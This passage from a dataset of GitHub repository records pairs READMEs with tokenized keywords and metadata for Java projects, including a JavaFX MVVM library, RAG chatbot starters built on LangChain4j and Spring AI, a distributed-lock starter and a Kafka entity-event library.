'way', 'many', 'framework', 'provide', 'good', 'acceptable', 'separation', 'concern', 'however', 'drawback', 'mvc', 'pattern', 'especially', 'javafx', 'one', 'main', 'drawback', 'controller', 'layer', 'difficult', 'impossible', 'test', 'especially', 'concerning', 'javafx', 'developer', 'worked', 'fxml', 'controller', 'class', 'pattern', 'help', 'avoid', 'coupling', 'ui', 'component', 'model', 'data', 'presentation', 'logic', 'within', 'controller', 'class', 'ui', 'component', 'available', 'runtime', 'difficult', 'test', 'interaction', 'presentation', 'logic', 'model', 'ui', 'layer', 'solution', 'guessed', 'mvvm', 'ui', 'architecture', 'pattern', 'mvvm', 'mvvm', 'architectural', 'pattern', 'isolates', 'business', 'data', 'presentation', 'logic', 'view', 'ui', 'code', 'goal', 'simplify', 'user', 'interface', 'development', 'according', 'wikipedia', 'mvvm', 'variation', 'martin', 'fowler', 'perspective', 'presentation', 'model', 'design', 'pattern', 'next', 'let', 'see', 'apply', 'mvvm', 'ui', 'pattern', 'existing', 'javafx', 'application', 'converting', 'javafx', 'mvc', 'mvvm', 'ui', 'pattern', 'show', 'convert', 'javafx', 'mvc', 'structure', 'let', 'compare', 'difference', 'mvc', 'mvvm', 'ui', 'architecture', 'pattern', 'mvc', 'model', 'view', 'controller', 'typically', 'mvc', 'used', 'java', 'swing', 'javafx', 'ui', 'form', 'type', 'apps', 'javafx', 'developer', 'often', 'follow', 'supervising', 'controller', 'pattern', 'excerpt', 'describing', 'controller', 'ability', 'manipulate', 'view', 'complex', 'view', 'logic', 'supervising', 'controller', 'us', 'controller', 'handle', 'input', 'response', 'also', 'manipulate', 'view', 'handle', 'complex', 'view', 'logic', 'leaf', 'simple', 'view', 'behavior', 'declarative', 'system', 'intervening', 'effect', 'needed', 'beyond', 'achieved', 'declaratively', 'case', 'javafx', 'declarative', 'part', 'would', 'fxml', 'cs', 'xml', 'representing', 'view', 'javafx', 'also', 'bind', 'property', 'api', 'ui', 'control', 'listener', 'synchronize', 'model', 'data', 'convenient', 'inside', 'controller', 'presenter', 'class', 'code', 'tightly', 'coupled', 'regarding', 'presentation', 'logic', 'complex', 'view', 'logic', 'possibly', 'business', 'logic', 'making', 'code', 'difficult', 'maintain', 'debug', 'test', 'difficult', 'test', 'especially', 'many', 'ui', 'control', 'realized', 'dependency', 'injected', 'runtime', 'annotated', 'ui', 'control', 'inside', 'controller', 'class', 'let', 'look', 'mvvm', 'pattern', 'differs', 'mvvm', 'model', 'view', 'viewmodel', 'mvvm', 'ui', 'pattern', 'variation', 'presentation', 'model', 'pattern', 'mvvm', 'presentation', 'model', 'pattern', 'achieve', 'separation', 'view', 'model', 'excerpt', 'martin', 'fowler', 'section', 'use', 'presentation', 'model', 'allows', 'write', 'logic', 'completely', 'independent', 'view', 'used', 'display', 'also', 'need', 'rely', 'view', 'store', 'state', 'important', 'manages', 'state', 'later', 'look', 'bind', 'data', 'view', 'viewmodel', 'synchronize', 'model', 'data', 'following', 'mvvm', 'normally', 'depected', 'notice', 'model', 'update', 'view', 'layer', 'main', 'difference', 'mvvm', 'mvc', 'main', 'advantage', 'testing', 'presentation', 'logic', 'separately', 'ui', 'form', 'associated', 'javafx', 'controller', 'class', 'seen', 'pro', 'con', 'mvc', 'mvvm', 'conceptually', 'convert', 'javafx', 'mvc', 'ui', 'form', 'mvvm', 'pattern', 'hint', 'refactor', 'pull', 'presentation', 'logic', 'business', 'logic', 'away', 'javafx', 'controller', 'viewmodels', 'model', 'service', 'converting', 'javafx', 'mvc', 'form', 'ui', 'using', 'mvvm', 'pattern', 'conceptual', 'way', 'think', 'javafx', 'using', 'mvvm', 'ui', 'pattern', 'cognitive', 'library', 'let', 'refactor', 'thing', 'pace', 'get', 'comfortable', 'notice', 'javafx', 'controller', 'class', 'contain', 'less', 'code', 'presentation', 'logic', 'move', 'viewmodels', 'shown', 'treat', 'javafx', 'fxml', 'controller', 'class', 'view', 'model', 'remain', 'difference', 'viewmodels', 'contain', 'much', 'state', 'ui', 'form', 'presentation', 'logic', 'objective', 'make', 'view', 'stupid', 'know', 'conceptually', 'let', 'look', 'code', 'example', 'controller', 'save', 'operation', 'typical', 'controller', 'without', 'use', 'view', 'model', 'example', 'ui', 'form', 'save', 'data', 'let', 'look', 'use', 'view', 'model', 'controller', 'class', 'using', 'validationviewmodels', 'controller', 'using', 'view', 'model', 'presentation', 'logic', 'business', 'logic', 'testing', 'presentation', 'logic', 'populate', 'view', 'model', 'correct', 'value', 'without', 'modifying', 'ui', 'remember', 'view', 'model', 'contain', 'ui', 'control', 'shown', 'example', 'using', 'view', 'model', 'see', 'step', 'using', 'view', 'model', 'binding', 'bind', 'javafx', 'control', 'property', 'view', 'model', 'property', 'property', 'value', 'layer', 'validation', 'upon', 'method', 'perform', 'view', 'model', 'method', 'call', 'method', 'error', 'message', 'check', 'error', 'message', 'applied', 'control', 'user', 'feedback', 'model', 'value', 'valid', 'value', 'model', 'value', 'layer', 'code', 'call', 'view', 'model', 'method', 'return', 'raw', 'value', 'note', 'think', 'view', 'model', 'two', 'layer', 'property', 'value', 'model', 'value', 'validationviewmodel', 'save', 'see', 'much', 'work', 'us', 'view', 'model', 'instead', 'method', 'ui', 'code', 'inside', 'controller', 'class', 'developer', 'aim', 'remove', 'state', 'presentation', 'logic', 'controller', 'class', 'let', 'look', 'two', 'main', 'implementation', 'viewmodel', 'interface', 'simpleviewmodel', 'validationviewmodel', 'let', 'start', 'creating', 'one', 'property', 'string', 'first', 'name', 'objective', 'create', 'javafx', 'text', 'field', 'bind', 'value', 'view', 'model', 'property', 'bind', 'property', 'following', 'output', 'see', 'whenever', 'user', 'enters', 'text', 'text', 'field', 'view', 'model', 'property', 'first', 'name', 'get', 'populated', 'usually', 'ui', 'form', 'validation', 'needed', 'used', 'form', 'control', 'bound', 'property', 'view', 'model', 'call', 'method', 'copy', 'initial', 'model', 'value', 'back', 'property', 'value', 'thus', 'clearing', 'screen', 'method', 'copy', 'property', 'value', 'model', 'value', 'layer', 'simple', 'uis', 'validate', 'field', 'manually', 'next', 'let', 'look', 'validationviewmodel', 'allow', 'developer', 'add', 'validation', 'property', 'following', 'example', 'show', 'create', 'property', 'add', 'validators', 'use', 'case', 'typically', 'user', 'save', 'information', 'would', 'need', 'validate', 'obtaining', 'model', 'value', 'new', 'version', 'enums', 'property', 'name', 'output', 'notice', 'first', 'name', 'field', 'required', 'must', 'character', 'phone', 'number', 'formatted', 'incorrectly', 'validation', 'message', 'contains', 'property', 'field', 'question', 'code', 'create', 'decorator', 'badge', 'affixed', 'ui', 'control', 'allow', 'user', 'see', 'error', 'warning', 'let', 'fix', 'validation', 'issue', 'instead', 'calling', 'call', 'override', 'method', 'method', 'essentially', 'copy', 'property', 'value', 'model', 'value', 'layer', 'since', 'call', 'method', 'happens', 'method', 'property', 'value', 'copied', 'error', 'occur', 'correct', 'thing', 'obtain', 'view', 'model', 'model', 'value', 'calling', 'following', 'think', 'property', 'value', 'view', 'model', 'used', 'form', 'ui', 'model', 'value', 'used', 'backend', 'inject', 'view', 'model', 'javafx', 'controller', 'creating', 'javafx', 'controller', 'class', 'add', 'view', 'model', 'using', 'annotation', 'follows', 'created', 'fxml', 'view', 'controller', 'must', 'use', 'facility', 'demo', 'account', 'creation', 'form', 'demo', 'ui', 'form', 'without', 'value', 'user', 'type', 'field', 'validator', 'populating', 'form', 'update', 'submit', 'button', 'state', 'field', 'populated', 'save', 'button', 'disabled', 'pressing', 'submit', 'button', 'validation', 'behavior', 'occurs', 'afterwards', 'see', 'demo', 'code', 'see', 'form', 'demo', 'input', 'error', 'save', 'validate', 'submit', 'pressed', 'show', 'overlay', 'icon', 'field', 'error', 'see', 'user', 'entered', 'initial', 'character', 'upper', 'case', 'f', 'one', 'error', 'message', 'alert', 'user', 'must', 'character', 'new', 'support', 'multiple', 'error', 'message', 'using', 'validator', 'let', 'show', 'multiple', 'message', 'related', 'first', 'name', 'field', 'following', 'requirement', 'validation', 'rule', 'first', 'name', 'must', 'blank', 'must', 'greater', 'character', 'first', 'character', 'must', 'upper', 'case', 'let', 'enter', 'one', 'lowercase', 'character', 'first', 'name', 'field', 'click', 'submit', 'evaluate', 'error', 'message', 'shown', 'new', 'support', 'multiple', 'validation', 'message', 'using', 'consumervalidators', 'notice', 'first', 'name', 'field', 'user', 'entered', 'one', 'lowercase', 'f', 'character', 'getting', 'validation', 'message', 'see', 'add', 'multiple', 'validation', 'message', 'shown', 'first', 'name', 'field', 'let', 'add', 'correct', 'data', 'valid', 'input', 'new', 'feature', 'new', 'feature', 'simplify', 'code', 'certain', 'scenario', 'updating', 'view', 'model', 'jfxnode', 'object', 'fxml', 'loaded', 'method', 'getting', 'view', 'model', 'jfxnode', 'object', 'fxml', 'loaded', 'method', 'running', 'code', 'block', 'property', 'changed', 'method', 'validate', 'change', 'run', 'validators', 'based', 'property', 'change', 'determine', 'form', 'invalid', 'method', 'determine', 'form', 'valid', 'method', 'calling', 'method', 'jfxnode', 'object', 'returned', 'representing', 'javafx', 'node', 'controller', 'contained', 'jfxnode', 'record', 'way', 'update', 'property', 'view', 'model', 'injected', 'controller', 'shown', 'code', 'snippet', 'notice', 'method', 'take', 'variable', 'name', 'inside', 'controller', 'lambda', 'containing', 'view', 'model', 'modified', 'calling', 'method', 'jfxnode', 'object', 'returned', 'representing', 'javafx', 'node', 'controller', 'contained', 'jfxnode', 'record', 'way', 'get', 'view', 'model', 'previously', 'injected', 'controller', 'shown', 'code', 'snippet', 'notice', 'method', 'take', 'variable', 'name', 'return', 'instance', 'ever', 'want', 'run', 'code', 'block', 'property', 'value', 'changed', 'following', 'notice', 'lambda', 'runnable', 'executed', 'property', 'first', 'name', 'last', 'name', 'email', 'property', 'value', 'change', 'validate', 'property', 'change', 'method', 'property', 'value', 'changed', 'validators', 'get', 'run', 'validation', 'message', 'passed', 'help', 'update', 'ui', 'example', 'decorating', 'icon', 'overlay', 'first', 'name', 'field', 'provide', 'user', 'feedback', 'error', 'notice', 'clear', 'tooltip', 'error', 'overlay', 'concatenates', 'error', 'message', 'shown', 'user', 'invalid', 'property', 'validationviewmodel', 'method', 'invalid', 'property', 'detects', 'true', 'validation', 'message', 'otherwise', 'false', 'often', 'used', 'validate', 'whole', 'form', 'disabling', 'enabling', 'save', 'button', 'shown', 'notice', 'javafx', 'button', 'disable', 'property', 'bound', 'invalid', 'property', 'also', 'get', 'set', 'based', 'following', 'code', 'validate', 'run', 'error', 'message', 'collected', 'greater', 'zero', 'invalid', 'property', 'get', 'set', 'true', 'valid', 'property', 'validationviewmodel', 'method', 'validation', 'view', 'model', 'method', 'called', 'check', 'zero', 'validation', 'message', 'shown', 'references', 'following', 'link', 'topic', 'pattern', 'gui', 'architectural', 'pattern', 'martin', 'fowler', 'model', 'view', 'controller', 'flow', 'synchronization', 'pattern', 'synch', 'data', 'ui', 'form', 'domain', 'object', 'separated', 'presentation', 'separating', 'presentation', 'business', 'logic', 'code', 'separate', 'layer', 'javafx', 'form', 'framework']","['model', 'view', 'property', 'controller', 'ui']",5,0,0,"['what', 'new', 'release', 'note', 'http', 'cognitive', 'quick', 'start', 'introduction', 'what', 'mvvm', 'convert', 'javafx', 'mvc', 'mvvm', 'ui', 'pattern', 'mvc', 'model', 'view', 'controller', 'mvvm', 'model', 'view', 'viewmodel', 'convert', 'javafx', 'mvc', 'form', 'ui', 'use', 'mvvm', 'pattern', 'this', 'typical', 'controller', 'without', 'use', 'view', 'model', 'use', 'validationviewmodels', 'controller', 'simpleviewmodel', 'validationviewmodel', 'how', 'inject', 'view', 'model', 'javafx', 'controller', 'demo', 'account', 'creation', 'form', 'new', 'feature', 'jfxnode', 'updateviewmodel', 'jfxnode', 'getviewmodel', 'viewmodel', 'validate', 'property', 'change', 'viewmodel', 'validateonchange', 'method', 'the', 'invalid', 'property', 'validationviewmodel', 'validationviewmodel', 'invalidproperty', 'method', 'the', 'valid', 'property', 'validationviewmodel', 'validationviewmodel', 'validproperty', 'method', 'reference']",23,"['validationviewmodel', 'mvvm', 'model', 'view', 'controller']",22,7.0,1.0,"[net.nicoulaj.maven.plugins:checksum-maven-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.panteleyev:jpackage-maven-plugin,org.sonatype.central:central-publishing-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0,24954,20.80473372781065,5.349544937428896,"['here -> https://github.com/carldea/cognitive/wiki', 'Release notes -> https://github.com/carldea/cognitive/releases', '1.5.0 -> https://github.com/carldea/cognitive/releases/tag/release%2F1.5.0', '1.4.0 -> https://github.com/carldea/cognitive/releases/tag/release%2F1.4.0', '1.3.0 -> https://github.com/carldea/cognitive/releases/tag/release%2F1.3.0', '1.2.0 -> https://github.com/carldea/cognitive/releases/tag/release%2F1.2.0', '1.1.0 -> https://github.com/carldea/cognitive/releases/tag/release%2F1.1.0', '1.0.0 -> https://github.com/carldea/cognitive/releases/tag/release%2F1.0.0', 'Form demo -> https://github.com/carldea/cognitive/tree/main/src/test/java/org/carlfx/cognitive/test/demo', 'Model View Controller -> http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller', 'separation of concerns. -> http://en.wikipedia.org/wiki/Separation_of_concerns', 'MVVM -> https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93viewmodel', 'Martin Fowler -> https://en.wikipedia.org/wiki/Martin_Fowler_(software_engineer', 'Presentation Model design pattern -> https://martinfowler.com/eaDev/PresentationModel.html', 'Supervising Controller Pattern -> https://martinfowler.com/eaaDev/SupervisingPresenter.html', 'Properties API -> https://dev.java/learn/javafx/properties/', 'mvc-ui-pattern -> https://github.com/carldea/cognitive/assets/1594624/b8d811a2-cab6-4ac4-aa0e-5778a03e0d0b', 'Presentation Model Pattern -> https://martinfowler.com/eaaDev/PresentationModel.html', 'mvvm-ui-pattern -> https://github.com/carldea/cognitive/assets/1594624/6e290bc4-2b5e-475f-991f-291b196e207f', 'javafx-mvvm-ui-pattern -> https://github.com/carldea/cognitive/assets/1594624/aa922411-e4fb-456a-93bc-6f8c7a333ad7', 'Form demo -> https://github.com/carldea/cognitive/tree/main/src/test/java/org/carlfx/cognitive/test/demo', 'demo1 -> https://github.com/carldea/cognitive/assets/1594624/320c19f2-6545-4f43-8762-522ec0100b93', 'GUI Architectural Patterns by Martin Fowler -> https://martinfowler.com/eaaDev/uiArchs.html', 'Flow Synchronization Pattern -> https://martinfowler.com/eaaDev/FlowSynchronization.html', 'Separated Presentation -> https://martinfowler.com/eaaDev/SeparatedPresentation.html', 'JavaFX Forms Framework -> https://carlfx.wordpress.com/2009/07/29/javafx-forms-framework-part-1/']",26
marcushellberg/java-chat-with-documents,main,"# Java AI chatbot that uses your documents as context 

This app demonstrates how you can create a custom AI chatbot that can use your own documents to answer questions using RAG (retrieval augmented generation).
The chatbot uses [LangChain4j](https://github.com/langchain4j/langchain4j) and the OpenAI API to generate responses and [Vaadin](http://vaadin.com/) to create the user interface.

> [!IMPORTANT]
> Before you can use the application you need to:
> 1. Configure the documentation location
> 2. Configure either OpenAi or a local LLM

## 🛠️ Configuration

### Configuring documentation location

Update the `docs.location` property in `application.properties` to point to a folder with relevant documents. 
LangChain4j uses Apache Tika internally when processing the files, so most file types work.

### Using Open AI

OpenAI gives you better quality answers but requires you to send data to a 3rd party.

To use OpenAI, get an [API key](https://platform.openai.com/api-keys) and configure it in `application.properties`. 
Optionally, you can also configure the model in the properties. 

### Using a local LLM

Using a local model allows you to keep your data on your local computer, but the quality of answers will not be as good as with OpenAI.

Install [Ollama](https://ollama.com/) and the `llama3` model.
Comment out the OpenAI section of `application.properties` and uncomment the Ollama section.

### Optional: Embedding store (Vector DB)

By default, the application uses an in-memory embedding store. This is fine for demos and small amounts of data. 
If you need to store more documents, consider using any of the [embedding stores that LangChain4j supports](https://docs.langchain4j.dev/integrations/embedding-stores/).

## ▶️ Running the application

The project is a standard Maven project. To run it from the command line,
type `mvnw` (Windows), or `./mvnw` (Mac & Linux), then open
http://localhost:8080 in your browser.

You can also import the project to your IDE of choice as you would with any
Maven project. Read more on [how to import Vaadin projects to different IDEs](https://vaadin.com/docs/latest/guide/step-by-step/importing) (Eclipse, IntelliJ IDEA, NetBeans, and VS Code).
",0,0,2,mit,3.0,"['java', 'ai', 'chatbot', 'us', 'document', 'context', 'app', 'demonstrates', 'create', 'custom', 'ai', 'chatbot', 'use', 'document', 'answer', 'question', 'using', 'rag', 'retrieval', 'augmented', 'generation', 'chatbot', 'us', 'openai', 'api', 'generate', 'response', 'vaadin', 'create', 'user', 'interface', 'important', 'use', 'application', 'need', 'configure', 'documentation', 'location', 'configure', 'either', 'openai', 'local', 'llm', 'configuration', 'configuring', 'documentation', 'location', 'update', 'property', 'point', 'folder', 'relevant', 'document', 'us', 'apache', 'tika', 'internally', 'processing', 'file', 'file', 'type', 'work', 'using', 'open', 'ai', 'openai', 'give', 'better', 'quality', 'answer', 'requires', 'send', 'data', 'party', 'use', 'openai', 'get', 'api', 'key', 'configure', 'optionally', 'also', 'configure', 'model', 'property', 'using', 'local', 'llm', 'using', 'local', 'model', 'allows', 'keep', 'data', 'local', 'computer', 'quality', 'answer', 'good', 'openai', 'install', 'ollama', 'model', 'comment', 'openai', 'section', 'uncomment', 'ollama', 'section', 'optional', 'embedding', 'store', 'vector', 'db', 'default', 'application', 'us', 'embedding', 'store', 'fine', 'demo', 'small', 'amount', 'data', 'need', 'store', 'document', 'consider', 'using', 'embedding', 'store', 'support', 'running', 'application', 'project', 'standard', 'maven', 'project', 'run', 'command', 'line', 'type', 'window', 'mac', 'linux', 'open', 'http', 'browser', 'also', 'import', 'project', 'ide', 'choice', 'would', 'maven', 'project', 'read', 'import', 'vaadin', 'project', 'different', 'ides', 'eclipse', 'intellij', 'idea', 'netbeans', 'vs', 'code']","['openai', 'using', 'project', 'us', 'document']",0,0,0,"['java', 'ai', 'chatbot', 'use', 'document', 'context', 'configuration', 'configure', 'documentation', 'location', 'use', 'open', 'ai', 'use', 'local', 'llm', 'optional', 'embedding', 'store', 'vector', 'db', 'run', 'application']",7,"['use', 'ai', 'java', 'chatbot', 'document']",0,0.0,1.0,"[com.vaadin:vaadin-maven-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,2212,18.157894736842103,4.953623188405797,"['LangChain4j -> https://github.com/langchain4j/langchain4j', 'Vaadin -> http://vaadin.com/', 'API key -> https://platform.openai.com/api-keys', 'Ollama -> https://ollama.com/', 'embedding stores that LangChain4j supports -> https://docs.langchain4j.dev/integrations/embedding-stores/', 'how to import Vaadin projects to different IDEs -> https://vaadin.com/docs/latest/guide/step-by-step/importing']",6
wb04307201/easy-ai-spring-boot-starter,master,"# easy-ai-spring-boot-starter
# 易智Spring

[![](https://jitpack.io/v/com.gitee.wb04307201/easy-ai-spring-boot-starter.svg)](https://jitpack.io/#com.gitee.wb04307201/easy-ai-spring-boot-starter)
[![star](https://gitee.com/wb04307201/easy-ai-spring-boot-starter/badge/star.svg?theme=dark)](https://gitee.com/wb04307201/easy-ai-spring-boot-starter)
[![fork](https://gitee.com/wb04307201/easy-ai-spring-boot-starter/badge/fork.svg?theme=dark)](https://gitee.com/wb04307201/easy-ai-spring-boot-starter)
[![star](https://img.shields.io/github/stars/wb04307201/easy-ai-spring-boot-starter)](https://github.com/wb04307201/easy-ai-spring-boot-starter)
[![fork](https://img.shields.io/github/forks/wb04307201/easy-ai-spring-boot-starter)](https://github.com/wb04307201/easy-ai-spring-boot-starter)  
![MIT](https://img.shields.io/badge/License-Apache2.0-blue.svg) ![JDK](https://img.shields.io/badge/JDK-17+-green.svg) ![SpringBoot](https://img.shields.io/badge/Srping%20Boot-3+-green.svg)

> 这不是一个AI大模型，但是可以帮你快速集成AI大模型到Spring项目中，  
> 并通过“检索增强生成(RAG)”的方式建立专家知识库帮助大模型回答问题。  
> 
> 核心功能依赖于[Spring AI](https://docs.spring.io/spring-ai/reference/index.html)实现，RAG运行原理如下  
> ![img_3.png](img_3.png)

## 代码示例
1. 使用[易智Spring](https://gitee.com/wb04307201/easy-ai-spring-boot-starter)实现的[AI大模型Demo](https://gitee.com/wb04307201/easy-ai-demo)

## 快速开始
### 引入依赖
增加 JitPack 仓库
```xml
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
```
引入jar
```xml
<dependency>
    <groupId>com.github.wb04307201</groupId>
    <artifactId>easy-ai-spring-boot-starter</artifactId>
    <version>0.6.1</version>
</dependency>
```

### 安装向量数据库
通过docker安装chromadb数据库
```shell
docker run -d --name chromadb -p 8000:8000 chromadb/chroma
```

### 安装大语言模型
默认通过[ollama](https://ollama.com/)使用大模型，下载并安装
```shell
# 拉取llama3模型
ollama pull llama3
# 拉取qwen2模型
ollama pull qwen2
```

### 添加相关配置
```yaml
spring:
  application:
    name: spring_ai_demo
  ai:
    ollama:
      chat:
        options:
          #  model: llama3
          model: qwen2
      embedding:
        options:
          model: qwen2
      base-url: ""http://localhost:11434""
    vectorstore:
      chroma:
        client:
          host: http://localhost
          port: 8000
        collection-name: SpringAiCollection
        initialize-schema: true
  servlet:
    multipart:
      max-file-size: 10MB
      max-request-size: 10MB
```

### 在启动类上加上`@EnableEasyAi`注解
```java
@EnableEasyAi
@SpringBootApplication
public class EasyAiDemoApplication {

    public static void main(String[] args) {
        SpringApplication.run(EasyAiDemoApplication.class, args);
    }

}
```

### 使用检索增强生成(RAG)辅助对话
当未上传知识库时  
![img_4.png](img_4.png)  
显然开始胡说八道了

现在让我们上传一些知识库，访问文档上传界面http://ip:端口/easy/ai/list  
![img.png](img.png)  
状态列显示“向量存储完”即文档已转入知识库  

访问聊天界面http://ip:端口/easy/ai/chat  
![img_5.png](img_5.png)

## 高级
### 使用其他大模型API
这里以[智谱AI](https://open.bigmodel.cn/)为例，如何对接大模型API  
修改项目依赖，支持的大模型平台可到[Spring AI](https://docs.spring.io/spring-ai/reference/index.html)查看  
```xml
        <dependency>
            <groupId>com.gitee.wb04307201</groupId>
            <artifactId>easy-ai-spring-boot-starter</artifactId>
            <version>0.6.1</version>
            <exclusions>
                <exclusion>
                    <groupId>org.springframework.ai</groupId>
                    <artifactId>spring-ai-ollama-spring-boot-starter</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency>
            <groupId>org.springframework.ai</groupId>
            <artifactId>spring-ai-zhipuai-spring-boot-starter</artifactId>
            <version>1.0.0-SNAPSHOT</version>
        </dependency>
```
修改配置项目
```yaml
spring:
  ai:
    zhipuai:
      api-key: 智谱AI API Key
```
> 除了大模型API外，向量数据库也可以参照上面的方式进行替换",0,0,2,apache-2.0,1.0,"['rag', 'spring', 'ai', 'jitpack', 'ollama', 'rag', 'spring', 'ai']","['rag', 'spring', 'ai', 'jitpack', 'ollama']",0,0,0,"['model', 'enableeasyai', 'rag']",15,"['model', 'enableeasyai', 'rag']",8,3.0,1.0,[],0.0,1.0,0.0,3844,33.142857142857146,5.519396551724138,"['![ -> https://jitpack.io/v/com.gitee.wb04307201/easy-ai-spring-boot-starter.svg', '![star -> https://gitee.com/wb04307201/easy-ai-spring-boot-starter/badge/star.svg?theme=dark', '![fork -> https://gitee.com/wb04307201/easy-ai-spring-boot-starter/badge/fork.svg?theme=dark', '![star -> https://img.shields.io/github/stars/wb04307201/easy-ai-spring-boot-starter', '![fork -> https://img.shields.io/github/forks/wb04307201/easy-ai-spring-boot-starter', 'MIT -> https://img.shields.io/badge/License-Apache2.0-blue.svg', 'JDK -> https://img.shields.io/badge/JDK-17+-green.svg', 'SpringBoot -> https://img.shields.io/badge/Srping%20Boot-3+-green.svg', 'Spring AI -> https://docs.spring.io/spring-ai/reference/index.html', '易智Spring -> https://gitee.com/wb04307201/easy-ai-spring-boot-starter', 'AI大模型Demo -> https://gitee.com/wb04307201/easy-ai-demo', 'ollama -> https://ollama.com/', '智谱AI -> https://open.bigmodel.cn/', 'Spring AI -> https://docs.spring.io/spring-ai/reference/index.html']",14
luohongtu/agency-lock,main,"# agency-lock

This open-source project is a proxy lock project that enables dynamic switching to different lock implementations using
the proxy lock approach. It is designed to upgrade from a single-machine lock to a distributed lock, catering to various
application scenarios.

## Getting started

- Download project

  `git clone https://github.com/luohongtu/agency-lock.git`
- Install to the local repository

  `mvn clean install`
- Add agency-lock-spring-boot-starter dependency

```pom
<dependency>
  <groupId>cn.foolishbird</groupId>
  <artifactId>agency-lock-spring-boot-starter</artifactId>
  <version>1.1.0</version>
</exclusions>

```
- Configure the springboot environment
```yml
agency:
  config:
    agencyLockType: ""redisson""
```
- The lock key generation policy
```java
@Configuration
public class AgencyLockConfig {

    @Bean(""springElGenerator"")
    public KeyGenerator springELMethonNameKeyGenerator() {
        return new SpringELMethonNameKeyGenerator();
    }

}
```
- Idempotent locks are used
```java
@Idempotent(key = ""#param.phone"", keyGenerator = ""springElGenerator"", leaseTime = 6)
public String login(@Validated @RequestBody PhoneLoginParam param) {
    return ""token"";
}
```

- AgencyLock locks are used
```java
@AgencyLock(key = ""#param.phone"", keyGenerator = ""springElGenerator"", leaseTime = 6)
public String login(@Validated @RequestBody PhoneLoginParam param) {
    return ""token"";
}
```

- Lock code block
```java
@Autowired
private AgencyLockManger agencyLockManger;

public void test1() throws Exception {
    String key = ""demoKey"";
    AgencyLock lock = agencyLockManger.getLock(key);
    try {
      lock.lock();
      // service code
      Thread.sleep(3000);
      System.out.println(""test success"");
    } finally {
      lock.unlock();
      agencyLockManger.removeLock(key);
    }
}
```

## [License](./license.txt)
agency-lock is Open Source software released under the Apache 2.0 license.
",0,0,1,apache-2.0,0.0,"['project', 'proxy', 'lock', 'project', 'enables', 'dynamic', 'switching', 'different', 'lock', 'implementation', 'using', 'proxy', 'lock', 'approach', 'designed', 'upgrade', 'lock', 'distributed', 'lock', 'catering', 'various', 'application', 'scenario', 'getting', 'started', 'download', 'project', 'install', 'local', 'repository', 'add', 'dependency', 'configure', 'springboot', 'environment', 'lock', 'key', 'generation', 'policy', 'idempotent', 'lock', 'used', 'agencylock', 'lock', 'used', 'lock', 'code', 'block', 'license', 'open', 'source', 'software', 'released', 'apache', 'license']","['lock', 'project', 'proxy', 'used', 'license']",0,0,0,"['get', 'start', 'license']",3,"['get', 'start', 'license']",6,0.0,5.0,[org.apache.maven.plugins:maven-compiler-plugin],0.0,4.0,1.0,1938,72.33333333333333,6.442396313364055,[],0
theodo-fintech/spring-data-event,main,"[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]

<div align=""center"">
  <h1 align=""center"">Spring Data Event</h1>
</div>

### Features

- **Data Event Entity**: Set up your JPA Entities to be automatically sent over Kafka topics when saved, updated or deleted simply using `@DataEventEntity`

More to come later... Stay tuned ! 


## Getting Started

### Prerequisites

This library has been currently tested on projects under SpringBoot on version 3.2.4 with Java 17 or later, using Hibernate as a JPA implementation.


### Installation

You will have to add the dependency in your spring-boot-project

```xml
<dependency>
    <groupId>com.sipios</groupId>
    <artifactId>spring-data-event</artifactId>
    <version>0.1.0</version>
</dependency>
```

### Configuration

Set up your application properties file to make spring kafka work properly

```txt
spring.kafka.bootstrap-servers=localhost:29092
```

Then, you will have to enable the library so that it will be able to work properly.
You just add the `@EnableDataEvent` on any of your `@Configuration` class already existing on your project, or directly on the `@SpringBootApplication` class.

## Usage


To mark a JPA entity to be automatically sent over event platform, put the `@DataEventEntity` on your entity

For instance

```java

@Entity
@DataEventEntity
@Table(name= ""user_account"")
public class UserEntity {

    @Id
    @Column(name = ""id"", nullable = false)
    @GeneratedValue(strategy = GenerationType.UUID)
    private UUID id;


}
```

By default, the topics on which the event will be sent are : 
- For the creation : `entity_name.created` (for example : `userentity.created`)
- For the update : `entity_name.updated` (for example : `userentity.updated`)
- For the deletion : `entity_name.deleted` (for example : `userentity.deleted`)


## FAQs

No FAQ at the moment

## Roadmap

- [x] Add simple case of sending creation, update and deletion event over kafka
- [ ] Allow customizing which events should be sent or not 
- [ ] Allow customizing which attribute from the entity to be sent or not 
- [ ] Allow other event techno as RabbitMQ or Apache Pulsar

## Contributing

We are just getting started on this project and would **highly appreciate** contributions

## License

Distributed under the MIT License. See [LICENSE](/LICENSE.txt) for more information.


[stars-shield]: https://img.shields.io/github/stars/sipios/spring-data-event?style=for-the-badge
[stars-url]: https://github.com/sipios/spring-data-event/stargazers
[issues-shield]: https://img.shields.io/github/issues/sipios/spring-data-event?style=for-the-badge
[issues-url]: https://github.com/sipios/spring-data-event/issues
[license-url]: https://github.com/sipios/spring-data-event/blob/main/LICENSE
",0,1,3,mit,4.0,"['feature', 'data', 'event', 'entity', 'set', 'jpa', 'entity', 'automatically', 'sent', 'kafka', 'topic', 'saved', 'updated', 'deleted', 'simply', 'using', 'come', 'later', 'stay', 'tuned', 'getting', 'started', 'prerequisite', 'library', 'currently', 'tested', 'project', 'springboot', 'version', 'java', 'later', 'using', 'hibernate', 'jpa', 'implementation', 'installation', 'add', 'dependency', 'configuration', 'set', 'application', 'property', 'file', 'make', 'spring', 'kafka', 'work', 'properly', 'enable', 'library', 'able', 'work', 'properly', 'add', 'class', 'already', 'existing', 'project', 'directly', 'class', 'usage', 'mark', 'jpa', 'entity', 'automatically', 'sent', 'event', 'platform', 'put', 'entity', 'instance', 'default', 'topic', 'event', 'sent', 'creation', 'example', 'update', 'example', 'deletion', 'example', 'faq', 'faq', 'moment', 'roadmap', 'x', 'add', 'simple', 'case', 'sending', 'creation', 'update', 'deletion', 'event', 'kafka', 'allow', 'customizing', 'event', 'sent', 'allow', 'customizing', 